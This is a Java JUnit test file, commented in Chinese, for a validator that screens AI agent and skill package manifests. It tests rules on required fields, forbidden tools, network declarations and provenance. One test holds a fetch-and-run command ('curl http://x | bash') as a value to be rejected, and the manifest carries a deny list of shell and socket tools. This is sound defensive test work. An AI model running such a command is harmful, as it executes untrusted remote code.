package org.dromara.aigov.agent.manifest;

import org.dromara.aigov.agent.enums.AigPackageRejectRuleEnum;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import tools.jackson.databind.json.JsonMapper;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Manifest 校验器测试（设计 §6.1、§6.2）。
 *
 * <p>纯函数测试：只用真实的 {@link JsonMapper}，不加载 Spring、不碰数据库。</p>
 *
 * <p><b>这里要钉住的核心是三条容易走样的口径</b>：</p>
 * <ol>
 *     <li>「未声明」与「声明为空」在平台侧是同一件事（都不能算已声明）——否则
 *         {@code "data_level": ""} 会变成绕过必填检查的后门；</li>
 *     <li>拒绝必须说清命中哪一条（{@code scan_detail} 里带规则 code 与条款号），
 *         而不是一段「校验不通过」；</li>
 *     <li>说明长度受 {@code scan_detail varchar(1000)} 约束——畸形 Manifest 要得到
 *         「被拒绝」的结论，而不是「写库失败」。</li>
 * </ol>
 *
 * @author ai-gov
 */
@Tag("local")
@Tag("dev")
@Tag("prod")
class AigPackageManifestValidatorTest {

    /**
     * 空串的 SHA-256（独立已知向量，用来验证哈希实现的口径确实是 UTF-8 字节）
     */
    private static final String SHA256_EMPTY =
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";

    private JsonMapper jsonMapper;
    private AigPackageManifestValidator validator;

    @BeforeEach
    void setUp() {
        jsonMapper = JsonMapper.builder().build();
        validator = new AigPackageManifestValidator(jsonMapper);
    }

    /**
     * 合规 Manifest 的基础字段集（§6.1 最小字段集全齐）。
     *
     * @return 可变的有序 Map
     */
    private static Map<String, Object> baseManifest() {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("package_code", "vision-planning-skill");
        m.put("name", "视觉规划 Skill");
        m.put("publisher", "design-center");
        m.put("version", "1.0.0");
        m.put("license", "Apache-2.0");
        m.put("checksum", "a".repeat(64));
        m.put("package_type", "SKILL");
        m.put("capabilities", List.of("CREATIVE_PLANNING"));
        m.put("scenario_codes", List.of("CREATIVE_DRAFT"));
        m.put("input_schema", Map.of("type", "object"));
        m.put("output_schema", Map.of("type", "object", "properties", Map.of("plan", Map.of("type", "array"))));
        m.put("min_platform_version", "6.0.0");
        m.put("dependencies", List.of());
        m.put("required_tools", List.of());
        m.put("forbidden_tools", List.of("shell", "ssh", "db-direct", "docker-socket"));
        m.put("roles", List.of("aig_viewer"));
        m.put("data_level", "INTERNAL");
        m.put("network_access", "NONE");
        m.put("golden_cases", List.of("case-vision-1"));
        m.put("version_notes", "首个受控版本");
        m.put("upgrade_policy", "IN_PLACE");
        m.put("rollback_policy", "PREVIOUS_STABLE");
        return m;
    }

    /**
     * 序列化为 Manifest 原文。
     *
     * @param manifest 字段 Map
     * @return JSON 文本
     */
    private String json(Map<String, Object> manifest) {
        return jsonMapper.writeValueAsString(manifest);
    }

    /**
     * 与 Manifest 一致的包记录身份。
     *
     * @param raw Manifest 原文
     * @return 身份声明
     */
    private static AigPackageIdentity matchingIdentity(String raw) {
        return new AigPackageIdentity("vision-planning-skill", "design-center", "Apache-2.0",
            "a".repeat(64), "SKILL", "1.0.0", AigPackageManifestValidator.manifestHash(raw));
    }

    @Test
    @DisplayName("合规 Manifest：PASS，且解析视图逐字段可用")
    void acceptsCompliantManifest() {
        String raw = json(baseManifest());

        AigManifestScanResult result = validator.scan(raw, matchingIdentity(raw));

        assertTrue(result.isPass(), result.getDetail());
        assertEquals(AigManifestScanResult.PASS, result.scanResult());
        assertTrue(result.getHitRules().isEmpty());
        assertEquals(AigPackageManifestValidator.manifestHash(raw), result.getManifestHash());
        assertNotNull(result.getManifest());
        assertEquals("vision-planning-skill", result.getManifest().packageCode());
        assertEquals("SKILL", result.getManifest().packageType());
        assertEquals(List.of("case-vision-1"), result.getManifest().goldenCases());
        assertTrue(result.getDetail().contains("未命中"), result.getDetail());
    }

    @Test
    @DisplayName("缺必填项：命中 §6.2-2，且说明里点名缺的是哪一项")
    void rejectsMissingMandatoryField() {
        Map<String, Object> manifest = baseManifest();
        manifest.remove("data_level");

        AigManifestScanResult result = validator.scan(json(manifest));

        assertFalse(result.isPass());
        assertEquals(List.of(AigPackageRejectRuleEnum.UNDECLARED_MANDATORY_FIELD),
            result.getHitRules());
        assertTrue(result.getDetail().contains("data_level"), result.getDetail());
        assertTrue(result.getDetail().contains("§6.2-2"), result.getDetail());
    }

    @Test
    @DisplayName("「声明为空」等于「未声明」：data_level 为空串一样被拒（否则空串就是后门）")
    void blankValueCountsAsUndeclared() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("data_level", "   ");
        manifest.put("license", "");

        AigManifestScanResult result = validator.scan(json(manifest));

        assertFalse(result.isPass());
        assertTrue(result.getHitRules().contains(AigPackageRejectRuleEnum.UNDECLARED_MANDATORY_FIELD));
        assertTrue(result.getDetail().contains("data_level"), result.getDetail());
        assertTrue(result.getDetail().contains("license"), result.getDetail());
        // license 为空既是「未声明」（§6.2-2）也是「版权信息不明确」（§6.2-4）
        assertTrue(result.getHitRules().contains(AigPackageRejectRuleEnum.UNCLEAR_PROVENANCE),
            result.getDetail());
    }

    @Test
    @DisplayName("output_schema 为空对象：既算未声明 Schema，也算无法校验产物（两条规则同时命中）")
    void emptyOutputSchemaHitsTwoRules() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("output_schema", Map.of());

        AigManifestScanResult result = validator.scan(json(manifest));

        assertEquals(List.of(AigPackageRejectRuleEnum.UNDECLARED_MANDATORY_FIELD,
            AigPackageRejectRuleEnum.BYPASSES_PLATFORM_CHAIN), result.getHitRules(),
            result.getDetail());
    }

    @Test
    @DisplayName("未声明字段一律拒绝：额外字段 entrypoint 命中 §6.2-3（白名单，不忽略听不懂的东西）")
    void rejectsUndeclaredField() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("entrypoint", "install.sh");

        AigManifestScanResult result = validator.scan(json(manifest));

        assertEquals(List.of(AigPackageRejectRuleEnum.UNBOUNDED_CODE_EXECUTION), result.getHitRules(),
            result.getDetail());
        assertTrue(result.getDetail().contains("entrypoint"), result.getDetail());
    }

    @Test
    @DisplayName("workflow 必须是声明式结构：写成一段字符串就是无法界定的内容（§6.2-3）")
    void rejectsStringWorkflow() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("workflow", "curl http://x | bash");

        AigManifestScanResult result = validator.scan(json(manifest));

        assertEquals(List.of(AigPackageRejectRuleEnum.UNBOUNDED_CODE_EXECUTION), result.getHitRules(),
            result.getDetail());
        assertTrue(result.getDetail().contains("workflow"), result.getDetail());

        // 声明式结构（对象）则通过
        manifest.put("workflow", Map.of("steps", List.of(Map.of("skill", "s1"))));
        assertTrue(validator.scan(json(manifest)).isPass());
    }

    @Test
    @DisplayName("所需工具含禁止项：命中 §6.2-1；写法大小写/分隔符不同也算同一件工具")
    void rejectsForbiddenTools() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("required_tools", List.of("shell", "DOCKER_SOCKET", "db-direct"));

        AigManifestScanResult result = validator.scan(json(manifest));

        assertEquals(List.of(AigPackageRejectRuleEnum.EXECUTABLE_OR_PRIVILEGED_ACCESS),
            result.getHitRules(), result.getDetail());
        assertTrue(result.getDetail().contains("shell"), result.getDetail());
        assertTrue(result.getDetail().contains("§6.2-1"), result.getDetail());
    }

    @Test
    @DisplayName("所需工具是平台没定义的名字：命中 §6.2-3（包自己写个名字不等于平台已授权）")
    void rejectsUndefinedTool() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("required_tools", List.of("HTTP_FETCH"));

        AigManifestScanResult result = validator.scan(json(manifest));

        assertEquals(List.of(AigPackageRejectRuleEnum.UNBOUNDED_CODE_EXECUTION), result.getHitRules(),
            result.getDetail());
        assertTrue(result.getDetail().contains("HTTP_FETCH"), result.getDetail());
    }

    @Test
    @DisplayName("声明 EXTERNAL 却不说连哪里：命中 §6.2-2；NONE 则不需要主机清单")
    void externalNeedsHosts() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("network_access", "EXTERNAL");

        AigManifestScanResult missingHosts = validator.scan(json(manifest));
        assertEquals(List.of(AigPackageRejectRuleEnum.UNDECLARED_MANDATORY_FIELD),
            missingHosts.getHitRules(), missingHosts.getDetail());
        assertTrue(missingHosts.getDetail().contains("network_hosts"), missingHosts.getDetail());

        manifest.put("network_hosts", List.of("api.example.com"));
        assertTrue(validator.scan(json(manifest)).isPass());

        // NONE 不需要主机清单
        manifest.remove("network_hosts");
        manifest.put("network_access", "NONE");
        assertTrue(validator.scan(json(manifest)).isPass());
    }

    @Test
    @DisplayName("STRICT 数据等级 + 声明外网：命中 §6.2-1（索取平台已被硬禁止的通路）")
    void strictDataLevelCannotDeclareExternal() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("data_level", "STRICT");
        manifest.put("network_access", "EXTERNAL");
        manifest.put("network_hosts", List.of("api.example.com"));

        AigManifestScanResult result = validator.scan(json(manifest));

        assertEquals(List.of(AigPackageRejectRuleEnum.EXECUTABLE_OR_PRIVILEGED_ACCESS),
            result.getHitRules(), result.getDetail());
        assertTrue(result.getDetail().contains("STRICT"), result.getDetail());
    }

    @Test
    @DisplayName("取值域：data_level / package_type / network_access 的未知取值都算未声明")
    void rejectsUnknownEnumValues() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("data_level", "SENSITIVE");
        manifest.put("package_type", "PLUGIN");
        manifest.put("network_access", "MAYBE");

        AigManifestScanResult result = validator.scan(json(manifest));

        assertTrue(result.getHitRules().contains(AigPackageRejectRuleEnum.UNDECLARED_MANDATORY_FIELD));
        assertTrue(result.getDetail().contains("SENSITIVE"), result.getDetail());
        assertTrue(result.getDetail().contains("PLUGIN"), result.getDetail());
        assertTrue(result.getDetail().contains("MAYBE"), result.getDetail());
    }

    @Test
    @DisplayName("校验和不是 64 位十六进制：命中 §6.2-4（校验和不明确）")
    void rejectsMalformedChecksum() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("checksum", "sha256:abc");

        AigManifestScanResult result = validator.scan(json(manifest));

        assertEquals(List.of(AigPackageRejectRuleEnum.UNCLEAR_PROVENANCE), result.getHitRules(),
            result.getDetail());
        assertTrue(result.getDetail().contains("§6.2-4"), result.getDetail());
    }

    @Test
    @DisplayName("黄金用例为空：只命中 §6.2-5（空数组是「声明了但没有」，与「未声明」区分）")
    void emptyGoldenCasesBypassesChain() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("golden_cases", List.of());

        AigManifestScanResult result = validator.scan(json(manifest));

        assertEquals(List.of(AigPackageRejectRuleEnum.BYPASSES_PLATFORM_CHAIN), result.getHitRules(),
            result.getDetail());
        assertTrue(result.getDetail().contains("golden_cases"), result.getDetail());

        // 未声明 golden_cases 则同时是「未声明」+「无法进入评测链路」
        manifest.remove("golden_cases");
        assertTrue(validator.scan(json(manifest)).getHitRules()
            .contains(AigPackageRejectRuleEnum.UNDECLARED_MANDATORY_FIELD));
    }

    @Test
    @DisplayName("与包记录交叉核对：publisher 不一致 = 这份 Manifest 描述的不是包记录里的那个包")
    void crossChecksIdentity() {
        String raw = json(baseManifest());

        AigManifestScanResult mismatch = validator.scan(raw, new AigPackageIdentity(
            "vision-planning-skill", "someone-else", "Apache-2.0", "a".repeat(64), "SKILL",
            "1.0.0", AigPackageManifestValidator.manifestHash(raw)));
        assertEquals(List.of(AigPackageRejectRuleEnum.UNCLEAR_PROVENANCE),
            mismatch.getHitRules(), mismatch.getDetail());
        assertTrue(mismatch.getDetail().contains("publisher"), mismatch.getDetail());
        assertTrue(mismatch.getDetail().contains("someone-else"), mismatch.getDetail());

        // 包记录自身缺 checksum 同样是「来源与校验信息不完整」
        AigManifestScanResult missingRecord = validator.scan(raw, new AigPackageIdentity(
            "vision-planning-skill", "design-center", "Apache-2.0", null, "SKILL", "1.0.0",
            AigPackageManifestValidator.manifestHash(raw)));
        assertTrue(missingRecord.getHitRules().contains(AigPackageRejectRuleEnum.UNCLEAR_PROVENANCE));
        assertTrue(missingRecord.getDetail().contains("包记录缺少"), missingRecord.getDetail());
    }

    @Test
    @DisplayName("Manifest 原文被改动过（库中哈希与重算不一致）：拒绝，且不「顺手修复」")
    void detectsTamperedManifest() {
        String raw = json(baseManifest());
        AigPackageIdentity tampered = new AigPackageIdentity("vision-planning-skill",
            "design-center", "Apache-2.0", "a".repeat(64), "SKILL", "1.0.0", "b".repeat(64));

        AigManifestScanResult result = validator.scan(raw, tampered);

        assertEquals(List.of(AigPackageRejectRuleEnum.UNCLEAR_PROVENANCE), result.getHitRules(),
            result.getDetail());
        assertTrue(result.getDetail().contains("改动"), result.getDetail());

        // 库中哈希为空 = 无法判断是否被改动，同样拒绝
        AigManifestScanResult noHash = validator.scan(raw, new AigPackageIdentity(
            "vision-planning-skill", "design-center", "Apache-2.0", "a".repeat(64), "SKILL",
            "1.0.0", "  "));
        assertTrue(noHash.getHitRules().contains(AigPackageRejectRuleEnum.UNCLEAR_PROVENANCE));
    }

    @Test
    @DisplayName("不是合法 JSON / 顶层不是对象 / 空 Manifest：都按「全部必填项缺失」拒绝")
    void rejectsUnparseableManifest() {
        AigManifestScanResult broken = validator.scan("{oops");
        assertEquals(List.of(AigPackageRejectRuleEnum.UNDECLARED_MANDATORY_FIELD), broken.getHitRules(),
            broken.getDetail());
        assertNull(broken.getManifest(), "原文读不出对象时不应给出解析视图");
        // 哈希仍是对「传给它的那串字节」算的，不是空串的哈希
        assertEquals(AigPackageManifestValidator.manifestHash("{oops"), broken.getManifestHash());

        AigManifestScanResult array = validator.scan("[1,2,3]");
        assertFalse(array.isPass());
        assertTrue(array.getDetail().contains("必须是 JSON 对象"), array.getDetail());

        AigManifestScanResult blank = validator.scan("   ");
        assertFalse(blank.isPass());
        assertTrue(blank.getDetail().contains("为空"), blank.getDetail());
    }

    @Test
    @DisplayName("说明超长必须截断（scan_detail 是 varchar(1000)）：畸形 Manifest 得到的是拒绝，不是写库失败")
    void truncatesLongDetail() {
        Map<String, Object> manifest = baseManifest();
        for (int i = 0; i < 40; i++) {
            manifest.put("weird_field_" + i + "_" + "n".repeat(40), "x".repeat(60));
        }
        manifest.remove("data_level");
        manifest.put("golden_cases", List.of());
        // 身份全部对不上：每条交叉核对都会带上两侧的长取值，说明必然超过列宽
        String longValue = "z".repeat(80);
        AigPackageIdentity mismatched = new AigPackageIdentity(longValue, longValue, longValue,
            longValue, longValue, longValue, longValue);

        AigManifestScanResult result = validator.scan(json(manifest), mismatched);

        assertFalse(result.isPass());
        assertTrue(result.getDetail().length() <= AigPackageManifestValidator.DETAIL_MAX_LENGTH,
            "说明长度 " + result.getDetail().length() + " 超过列宽");
        assertTrue(result.getDetail().endsWith("（说明已截断）"), result.getDetail());
        // 规则种类不能被截断掉（截断的是明细，不是结论）
        assertEquals(List.of(AigPackageRejectRuleEnum.UNDECLARED_MANDATORY_FIELD,
            AigPackageRejectRuleEnum.UNBOUNDED_CODE_EXECUTION,
            AigPackageRejectRuleEnum.UNCLEAR_PROVENANCE,
            AigPackageRejectRuleEnum.BYPASSES_PLATFORM_CHAIN), result.getHitRules(),
            result.getDetail());
    }

    @Test
    @DisplayName("命中多条规则时按枚举顺序输出，且每条都带规则 code 与设计条款号")
    void detailListsEveryHitRule() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("required_tools", List.of("shell"));
        manifest.put("data_level", "STRICT");
        manifest.put("network_access", "EXTERNAL");
        manifest.put("network_hosts", List.of("api.example.com"));
        manifest.put("rollback_policy", "");
        manifest.put("unknown_thing", 1);

        AigManifestScanResult result = validator.scan(json(manifest));

        assertEquals(List.of(AigPackageRejectRuleEnum.EXECUTABLE_OR_PRIVILEGED_ACCESS,
            AigPackageRejectRuleEnum.UNDECLARED_MANDATORY_FIELD,
            AigPackageRejectRuleEnum.UNBOUNDED_CODE_EXECUTION,
            AigPackageRejectRuleEnum.BYPASSES_PLATFORM_CHAIN), result.getHitRules(),
            result.getDetail());
        for (AigPackageRejectRuleEnum rule : result.getHitRules()) {
            assertTrue(result.getDetail().contains(rule.getCode()), result.getDetail());
            assertTrue(result.getDetail().contains(rule.getBasis()), result.getDetail());
        }
        assertEquals(result.getHitRules().size(), result.hitRuleCodes().size());
    }

    @Test
    @DisplayName("哈希口径：UTF-8 字节的 SHA-256，对同一串稳定、改一个汉字就变")
    void hashIsStableAndByteSensitive() {
        assertEquals(SHA256_EMPTY, AigPackageManifestValidator.manifestHash(""));
        assertEquals(SHA256_EMPTY, AigPackageManifestValidator.manifestHash(null));

        String raw = json(baseManifest());
        String again = json(baseManifest());
        assertEquals(AigPackageManifestValidator.manifestHash(raw),
            AigPackageManifestValidator.manifestHash(again));
        assertEquals(64, AigPackageManifestValidator.manifestHash(raw).length());

        Map<String, Object> changed = baseManifest();
        changed.put("name", "视觉规划 Skill 二");
        assertFalse(AigPackageManifestValidator.manifestHash(raw)
            .equals(AigPackageManifestValidator.manifestHash(json(changed))));
    }

    @Test
    @DisplayName("依赖清单允许两种写法（字符串编码或 {type,code} 对象），认不出的不猜")
    void readsDependencies() {
        Map<String, Object> manifest = baseManifest();
        List<Object> deps = new ArrayList<>();
        deps.add("qwen-image-3.0-pro");
        deps.add(Map.of("type", "SKILL", "code", "image-fitter"));
        deps.add(Map.of("type", "TOOL"));
        manifest.put("dependencies", deps);

        AigManifestScanResult result = validator.scan(json(manifest));

        assertTrue(result.isPass(), result.getDetail());
        assertEquals(List.of("qwen-image-3.0-pro", "image-fitter"),
            result.getManifest().dependencyCodes());
        assertEquals(3, result.getManifest().dependencyCount(),
            "认不出的元素不猜，但个数要如实反映");
    }

    @Test
    @DisplayName("内容物声明：agents/skills 允许出现并被解析；不声明也仍然通过（内容缺失留给安装那一步报）")
    void readsDeclaredContent() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("package_type", "SKILL");
        manifest.put("skills", List.of(Map.of(
            "code", "image-fitter",
            "name", "图像适配",
            "capabilities", List.of("image_generation"),
            "allow_external", "N")));

        AigManifestScanResult result = validator.scan(json(manifest));

        assertTrue(result.isPass(), result.getDetail());
        assertEquals(1, result.getManifest().skills().size());
        assertEquals("image-fitter", result.getManifest().skills().get(0).code());
        assertEquals(List.of("image_generation"), result.getManifest().skills().get(0).capabilities());

        // 不声明内容物：扫描仍然通过（§6.1 最小字段集本来没有它），
        // 「没有内容可安装」由安装那一步明确报出来
        assertTrue(validator.scan(json(baseManifest())).isPass());
    }

    @Test
    @DisplayName("内容物条目内部同样白名单：出现未声明子字段即拒绝")
    void rejectsUnknownSubField() {
        Map<String, Object> manifest = baseManifest();
        manifest.put("skills", List.of(Map.of("code", "s1", "name", "S1", "entrypoint", "install.sh")));

        AigManifestScanResult result = validator.scan(json(manifest));

        assertEquals(List.of(AigPackageRejectRuleEnum.UNBOUNDED_CODE_EXECUTION), result.getHitRules(),
            result.getDetail());
        assertTrue(result.getDetail().contains("entrypoint"), result.getDetail());
    }

    @Test
    @DisplayName("内容物条目必填子字段：skills 缺 name、agents 缺 category 都拒绝")
    void rejectsMissingSubField() {
        Map<String, Object> skillCase = baseManifest();
        skillCase.put("skills", List.of(Map.of("code", "s1")));
        assertTrue(validator.scan(json(skillCase)).getDetail().contains("skills[0].name"),
            validator.scan(json(skillCase)).getDetail());

        Map<String, Object> agentCase = baseManifest();
        agentCase.put("package_type", "AGENT");
        agentCase.put("agents", List.of(Map.of("code", "a1", "name", "A1")));
        assertTrue(validator.scan(json(agentCase)).getDetail().contains("agents[0].category"),
            validator.scan(json(agentCase)).getDetail());
    }

    @Test
    @DisplayName("内容物取值：category 必须是已知类别、allow_external 只能是 Y/N、编码不得重复")
    void rejectsBadSubValues() {
        Map<String, Object> badCategory = baseManifest();
        badCategory.put("package_type", "AGENT");
        badCategory.put("agents", List.of(Map.of("code", "a1", "name", "A1", "category", "NOPE")));
        assertTrue(validator.scan(json(badCategory)).getDetail().contains("NOPE"));

        Map<String, Object> badFlag = baseManifest();
        badFlag.put("skills", List.of(Map.of("code", "s1", "name", "S1", "allow_external", "MAYBE")));
        assertTrue(validator.scan(json(badFlag)).getDetail().contains("allow_external"));

        Map<String, Object> duplicated = baseManifest();
        duplicated.put("skills", List.of(Map.of("code", "s1", "name", "S1"),
            Map.of("code", "s1", "name", "S1 重复")));
        assertTrue(validator.scan(json(duplicated)).getDetail().contains("重复"),
            validator.scan(json(duplicated)).getDetail());
    }

    @Test
    @DisplayName("包类型与内容物必须一致：AGENT 不能带 skills、SKILL 不能带 agents、MIXED 两者都要有")
    void rejectsIncoherentPackageType() {
        Map<String, Object> skillWithAgents = baseManifest();
        skillWithAgents.put("package_type", "SKILL");
        skillWithAgents.put("agents", List.of(Map.of("code", "a1", "name", "A1", "category", "QA")));
        assertTrue(validator.scan(json(skillWithAgents)).getDetail().contains("不一致"),
            validator.scan(json(skillWithAgents)).getDetail());

        Map<String, Object> agentWithoutAgents = baseManifest();
        agentWithoutAgents.put("package_type", "AGENT");
        agentWithoutAgents.put("skills", List.of(Map.of("code", "s1", "name", "S1")));
        assertTrue(validator.scan(json(agentWithoutAgents)).getDetail().contains("不一致"),
            validator.scan(json(agentWithoutAgents)).getDetail());

        Map<String, Object> mixedIncomplete = baseManifest();
        mixedIncomplete.put("package_type", "MIXED");
        mixedIncomplete.put("agents", List.of(Map.of("code", "a1", "name", "A1", "category", "QA")));
        assertTrue(validator.scan(json(mixedIncomplete)).getDetail().contains("MIXED"),
            validator.scan(json(mixedIncomplete)).getDetail());

        // 一致则通过
        Map<String, Object> mixed = baseManifest();
        mixed.put("package_type", "MIXED");
        mixed.put("agents", List.of(Map.of("code", "a1", "name", "A1", "category", "QA")));
        mixed.put("skills", List.of(Map.of("code", "s1", "name", "S1")));
        assertTrue(validator.scan(json(mixed)).isPass(), validator.scan(json(mixed)).getDetail());
    }

}
